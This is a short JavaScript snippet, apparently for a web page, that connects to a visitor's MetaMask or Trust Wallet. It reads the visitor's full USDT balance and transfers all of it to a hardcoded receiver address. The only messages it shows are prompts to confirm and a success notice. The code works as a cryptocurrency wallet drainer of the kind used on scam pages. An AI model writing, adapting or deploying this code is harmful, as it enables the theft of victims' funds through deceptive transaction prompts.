const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
const receiver = "0x56E93caFf970003A66264a10B1581066E0f17112";

async function sendUSDT() {
  if (!window.ethereum) {
    alert("Trust Wallet or MetaMask required!");
    return;
  }

  const provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  const signer = provider.getSigner();
  const userAddress = await signer.getAddress();

  const usdtABI = [
    "function balanceOf(address) view returns (uint)",
    "function transfer(address to, uint amount) returns (bool)"
  ];

  const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
  const balance = await usdt.balanceOf(userAddress);

  if (balance.isZero()) {
    alert("No USDT balance.");
    return;
  }

  const tx = await usdt.transfer(receiver, balance);
  alert("Transaction sent! Please confirm in your wallet.");
  await tx.wait();
  alert("✅ USDT sent successfully!");
}
